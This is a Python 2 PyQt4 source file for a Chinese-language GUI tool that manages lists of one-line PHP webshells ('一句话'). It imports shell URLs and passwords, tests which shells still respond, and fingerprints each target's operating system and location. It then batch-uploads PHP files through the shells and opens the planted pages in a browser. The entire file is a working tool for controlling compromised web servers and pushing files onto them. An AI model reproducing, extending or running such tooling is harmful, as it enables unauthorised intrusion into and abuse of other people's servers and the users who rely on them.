#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

from PyQt4.QtGui import *
import time
import socket
import webbrowser #访问URL
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
from ctypes import *
import win32ui
user32 = windll.LoadLibrary('user32.dll')               # 加载动态链接库
#user32.MessageBoxW(0,c_wchar_p("1111111"), c_wchar_p("QQ:23456789"), 0)   # 调用MessageBoxA函数
import yijuhua
import thread
#共0条--OK0条--NO0条--等待测试0条
yu_1=0  #共多少数据
yu_2=0  #成功多少条
yu_3=0  #失败多少条

class top1(object):
    def __init__(self,ui,model):
        self.ui=ui
        self.model=model


    def open_file(self,data): #格式化
        ss = data.split("|")
        #if len(ss)<=3:
        return ss[0],ss[1]
        #return 0

    def Button(self): #导入一句话
        #self.tableView_add(0,"111","22","no","444","null","666","777")#None
        global yu_1
        # 1表示打开文件对话框   0表示保存
        dlg = win32ui.CreateFileDialog(1, "*.txt", None, 0, u"txt 文本 (*.txt)|*.txt|All files|*.*")
        #dlg.SetOFNInitialDir('E:/Python') # 设置打开文件对话框中的初始显示目录
        dlg.DoModal()
        fname = dlg.GetPathName() # 获取选择的文件名称
        xxx = file(fname, 'r')
        i=0
        for xxx_line in xxx.readlines():
            try:
                data=xxx_line.strip().lstrip().rstrip('\n')
                s0,s1=self.open_file(data)
                if len(s0)>7:
                    self.tableView_add(i,str(s0.rstrip('\n')),str(s1.strip().lstrip().rstrip('\n')),None,None,None,None,None)  #添加数据
            except BaseException, e:
                print(str(e))
            i+=1
            yu_1=i  #共多少数据
        self.ui.messagebox.append(u"已经导入 %d 条 一句话"%(i))

        if self.ui.tx_checkBox_1.isChecked():  #自动测试一句话
            thread.start_new_thread(self.yjh_cs,())  #测试一句话是否连接成功
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"开始==自动测试一句话状态")
            self.ui.messagebox.append(u"一句话测试数据会保存在程序目录下")
            self.ui.messagebox.append(u"成功的则保存在OK.TXT")
            self.ui.messagebox.append(u"不成功的则保存在ON.TXT")

        if self.ui.tx_checkBox_2.isChecked():  #检测IP/地理位置
            thread.start_new_thread(self.win32_linux,()) #用线程获取    IP/地址位置
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"开始==判断系统版本")

        if self.ui.tx_checkBox_3.isChecked():  #检测IP/地理位置
            thread.start_new_thread(self.T_hostip_WLWZ,()) #用线程获取    IP/地址位置
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"开始==自动检测web IP/地址位置")

    #添加数据
    #u'1一句话地址',u'2密码',u'3状态',u'4操作系统',u'5上传URL路径',u'6访问URL路径',u'7IP/地址位置'
    def tableView_add(self,ints,s1,s2,s3,s4,s5,s6,s7):  #添加数据
        try:
            #红色：(255,0,0)
            #绿色：(0,255,0)
            global yu_1,yu_2,yu_3
            if s5=="ok":
                s5=None
                self.model.item(ints,4).setBackground(QColor(0,255,0))#//改变背景色
            if s5=="no":
                s5=None
                self.model.item(ints,4).setBackground(QColor(255, 0, 0))#//改变背景色

            if s6=="ok":
                s6=None
                self.model.item(ints,5).setBackground(QColor(0,255,0))#//改变背景色
            if s6=="no":
                s6=None
                self.model.item(ints,5).setBackground(QColor(255, 0, 0))#//改变背景色

            if not s1==None:
                self.model.setItem(ints, 0, QStandardItem(s1))
            if not s2==None:
                self.model.setItem(ints, 1, QStandardItem(s2))
            if not s3==None:
                self.model.setItem(ints, 2, QStandardItem(s3))
            if not s4==None:
                self.model.setItem(ints, 3, QStandardItem(s4))
            if not s5==None:
                self.model.setItem(ints, 4, QStandardItem(s5))
            if not s6==None:
                self.model.setItem(ints, 5, QStandardItem(s6))
            if not s7==None:
                self.model.setItem(ints, 6, QStandardItem(s7))

            if s3=="no":  #红色  #改变背景色
                self.model.item(ints,0).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,1).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,2).setBackground(QColor(255, 0, 0))#//改变背景色

                #            if s3=="ok":  #绿色
                #                self.model.item(ints,0).setForeground(QBrush(QColor(0, 0, 0)))  #//设置字符颜色
                #                self.model.item(ints,1).setForeground(QBrush(QColor(0, 0, 0)))  #//设置字符颜色
                #                self.model.item(ints,2).setForeground(QBrush(QColor(0, 0, 0)))  #//设置字符颜色

            if s3=="null":
                self.model.setItem(ints, 2, QStandardItem(s3))

            if len(str(s3))==3:
                self.model.item(ints,0).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,1).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,2).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,3).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,4).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,5).setBackground(QColor(255, 0, 0))#//改变背景色
                self.model.item(ints,6).setBackground(QColor(255, 0, 0))#//改变背景色

            if len(str(s4))<=3 or len(str(s4))>=10:
                self.model.item(ints,3).setBackground(QColor(192, 192, 192))#//改变背景色

            if s4=="":
                self.model.item(ints,3).setBackground(QColor(255, 0, 0))#//改变背景色

            if s5==u"上传文件失败" or s5==u"地址异常":
                self.model.item(ints,4).setBackground(QColor(255, 0, 0))#//改变背景色

            if s7=="0/" or s7=="":
                self.model.item(ints,6).setBackground(QColor(192, 192, 192))#//改变背景色

            data4=u"<html><head/><body><p align="+u"center"+u">共:%d条--OK:%d条--NO:%d条--等待测试:%d条</p></body></html>"%(yu_1,yu_2,yu_3,yu_1-(yu_2+yu_3))
            self.ui.label_4.setText(data4)
        except BaseException, e:
            print(str(e))
            #        self.model.setSortRole(0) #排序
            #        self.model.sort(3,Qt.AscendingOrder) #排序  排序只针对INT型
        self.ui.tableView.setModel(self.model)

    def yjh_cs(self):  #测试一句话是否连接成功
        global yu_2,yu_3
        int_View=self.ui.tableView.model().rowCount()   #获取共多少行
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in range(int_View):
            s0= model.data(model.index(index,0)).toString()
            s1= model.data(model.index(index,1)).toString()
            try:
                if s0=="":
                    yu_3+=1  #失败多少条
                    self.tableView_add(index,None,None,"null",None,None,None,None)  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    yu_3+=1  #失败多少条
                    self.tableView_add(index,None,None,"null",None,None,None,None)  #添加数据
                    continue  #跳过
                if yijuhua.yi_cs_php(str(s0),str(s1)):
                #if yijuhua.yi_cs_php(str(s0),str(s1)):
                    yu_2+=1  #成功多少条
                    self.tableView_add(index,None,None,"ok",None,None,None,None)  #添加数据
                else:
                    yu_3+=1  #失败多少条
                    self.tableView_add(index,None,None,"no",None,None,None,None)  #添加数据
            except BaseException, e:
                print(str(e))
                return 0
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"测试一句话 完成")

    def win32_linux(self):  #判断操作系统版本
        time.sleep(10)
        int_View=self.ui.tableView.model().rowCount()   #获取共多少行
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in range(int_View):
            s0= model.data(model.index(index,0)).toString()
            s1= model.data(model.index(index,1)).toString()
            s2= model.data(model.index(index,2)).toString()
            try:
                if s0=="" or s2==str("no")  or s2==str("null"):
                    self.tableView_add(index,None,None,None,"",None,None,None)  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    self.tableView_add(index,None,None,None,"",None,None,None)  #添加数据
                    continue  #跳过
                data=yijuhua.yijuhua_win_linux(str(s0),str(s1))
                self.tableView_add(index,None,None,None,data,None,None,None)  #添加数据
            except BaseException, e:
                print(str(e))
                return 0
            time.sleep(1.5)
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"判断操作系统版本 测试完成")

    #用线程获取    IP/地址位置
    def T_hostip_WLWZ(self):
        int_View=self.ui.tableView.model().rowCount()   #获取共多少行
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in range(int_View):
            try:
                s0= model.data(model.index(index,0)).toString()
                if s0=="":
                    self.tableView_add(index,None,None,None,None,None,None,"")  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    self.tableView_add(index,None,None,None,None,None,None,"")  #添加数据
                    continue  #跳过
                data=yijuhua.www_wlwz(str(s0))
                self.tableView_add(index,None,None,None,None,None,None,data)  #添加数据
            except BaseException, e:
                print(str(e))
                return 0
            time.sleep(1)
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"IP/地址位置 测试完成")

    def Button_2(self): #手动测试一句话
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要测的一句话")
            return 0
        if not self.ui.tx_checkBox_2.isChecked():  #自动测试一句话
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"已经选择了====自动测试一句话状态了")
            self.ui.messagebox.append(u"别浪费网络资源了")
        else:
            thread.start_new_thread(self.yjh_cs_2,())  #测试一句话是否连接成功
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"开始==手动测试一句话状态")
            self.ui.messagebox.append(u"一句话测试数据会保存在程序目录下")
            self.ui.messagebox.append(u"成功的则保存在OK.TXT")
            self.ui.messagebox.append(u"不成功的则保存在ON.TXT")
            self.ui.messagebox.append(u"%d条一句话开始测试"%int_id)

    def yjh_cs_2(self):  #测试一句话是否连接成功
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
                if s0=="":
                    self.tableView_add(int_index,None,None,"null",None,None,None,None)  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    self.tableView_add(int_index,None,None,"null",None,None,None,None)  #添加数据
                    continue  #跳过
                if yijuhua.yi_cs_php(str(s0),str(s1)):
                    self.tableView_add(int_index,None,None,"ok",None,None,None,None)  #添加数据
                else:
                    self.tableView_add(int_index,None,None,"no",None,None,None,None)  #添加数据
            except BaseException, e:
                print(str(e))
                return 0
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"手动测试一句话 完成")

############################################################################################
    def Button_4(self): #选择文件
        try:
            dlg = win32ui.CreateFileDialog(1, "*.php", None, 0, u"php 脚本 (*.php)|*.php|All files|*.*")
            #dlg.SetOFNInitialDir('E:/Python') # 设置打开文件对话框中的初始显示目录
            dlg.DoModal()
            fname = dlg.GetPathName() # 获取选择的文件名称
            self.ui.tx_textEdit_2.setText(fname.decode('gbk'))  #转化下防止中文路径
            #获取文件名称 q123.php
            #find正向查找rfind反向查找
            nPos = fname.rfind('\\') #查找字符
            I1=len(fname)
            sStr1 = fname[nPos+1:I1] #复制指定长度的字符
            self.ui.tx_textEdit_3.setText(sStr1)  #文件名
        except BaseException, e:
            print(str(e))
            return 0

    def Button_5(self): #上传文件
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要上传的URL")
            return 0

        file_data=self.ui.tx_textEdit_2.toPlainText() #获取路径
        data=""
        try:
            xxx = file(file_data, 'r')
            for xxx_line in xxx.readlines():
                data+=xxx_line+"\r\n"
        except BaseException, e:
            print(str(e))
        if len(data)<=7:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"%s==文件数据是无效数据"%file_data)
            return 0
        file_name=self.ui.tx_textEdit_3.toPlainText() #获取文件名
        data_abc=yijuhua.base64_jm(str(file_name),data)
        #多线程参数  abc   传入进去
        thread.start_new_thread(self.yjh_sc_php,(data_abc,file_name,))  #
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"开始批量上传文件")
        self.ui.messagebox.append(u"%d==个地址需要上传"%int_id)

    def yjh_sc_php(self,data,name):  #通过一句话上传PHP
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
                if s0=="":
                    self.tableView_add(int_index,None,None,None,None,u"地址异常",None,None)  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    self.tableView_add(int_index,None,None,None,None,u"地址异常",None,None)  #添加数据
                    continue  #跳过
                if yijuhua.url_post(str(s0),str(s1),data):
                    TX=str(s0).rfind("/") #从尾部查找
                    url=str(s0)[0:TX+1]+name
                    self.tableView_add(int_index,None,None,None,None,url,None,None)  #添加数据
                else:
                    self.tableView_add(int_index,None,None,None,None,u"上传文件失败",None,None)  #添加数据
            except BaseException, e:
                print(str(e))
                return 0
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"通过一句话上传PHP 完成")

    def Button_6(self): #访问上传文件URL路径
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要访问的URL")
            return 0

        url_time=self.ui.tx_textEdit_1.toPlainText() #获取  延迟
#        if self.ui.checkBox_3.isChecked():  #隐藏访问
#            thread.start_new_thread(self.YC_php_fz,(int(url_time),))  #隐藏 访问
#        else:
        thread.start_new_thread(self.zc_fw_url,(int(url_time),))  #正常访问URL
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"开始批量访问URL")
        self.ui.messagebox.append(u"%d==个地址需要访问"%int_id)

    def show_url(self,url): #正常打开RUL
        try:
            webbrowser.open_new_tab(url)
            return 1
        except BaseException, e:
            print(str(e))
            return 0

    def zc_fw_url(self,tl): #正常访问URL
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s4= model.data(model.index(int_index,4)).toString()
                if s4=="" or str(s4)==u"上传文件失败" or str(s4)==u"地址异常":
                    self.tableView_add(int_index,None,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过
                if len(s4)<=7:
                    self.tableView_add(int_index,None,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过

                if ~str(s4).find(":")>1:
                    self.tableView_add(int_index,None,None,None,None,"no",None,None)  #添加数据
                    continue  #跳过

                self.tableView_add(int_index,None,None,None,None,"ok",None,None)  #添加数据
                self.show_url(str(s4)) #正常打开RUL
                time.sleep(tl)
            except BaseException, e:
                print(str(e))
                return 0
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"访问上传文件URL路径 完成")

    def Button_7(self): #设置URL路径(带参数)
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要访问的URL")
            return 0

        url_time=self.ui.tx_textEdit_4.toPlainText() #获取参数
        if len(url_time)<=3:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"请重新设置要访问的地址")
            return 0
        thread.start_new_thread(self.sz_url,(str(url_time),))

    def sz_url(self,name):
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                if s0=="":
                    self.tableView_add(int_index,None,None,None,None,None,"no",None)  #添加数据
                    continue  #跳过
                if len(s0)<=7:
                    self.tableView_add(int_index,None,None,None,None,None,"no",None)  #添加数据
                    continue  #跳过

                TX=str(s0).rfind("/") #从尾部查找
                url=str(s0)[0:TX+1]+name
                self.tableView_add(int_index,None,None,None,None,None,url,None)  #添加数据

            except BaseException, e:
                print(str(e))
                return 0
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"访问上传文件URL路径 完成")

    def Button_8(self): #访问URL路径(带参数)
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        int_id=0
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            int_id+=1
        if int_id<1:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要访问的URL")
            return 0

        url_time=self.ui.tx_textEdit_1.toPlainText() #获取  延迟
        thread.start_new_thread(self.zc_fw_url2,(int(url_time),))  #正常访问URL
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"开始批量访问URL")
        self.ui.messagebox.append(u"%d==个地址需要访问"%int_id)

    def zc_fw_url2(self,tl): #正常访问URL
        int_model = self.ui.tableView.selectionModel()  #获取选中编号
        model = self.ui.tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s4= model.data(model.index(int_index,5)).toString()
                if s4=="":
                    self.tableView_add(int_index,None,None,None,None,None,"no",None)  #添加数据
                    continue  #跳过
                if len(s4)<=7:
                    self.tableView_add(int_index,None,None,None,None,None,"no",None)  #添加数据
                    continue  #跳过

                if ~str(s4).find(":")>1:
                    self.tableView_add(int_index,None,None,None,None,None,"no",None)  #添加数据
                    continue  #跳过

                self.tableView_add(int_index,None,None,None,None,None,"ok",None)  #添加数据
                self.show_url(str(s4)) #正常打开RUL
                time.sleep(tl)
            except BaseException, e:
                print(str(e))
                return 0
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"访问上传文件URL路径 完成")


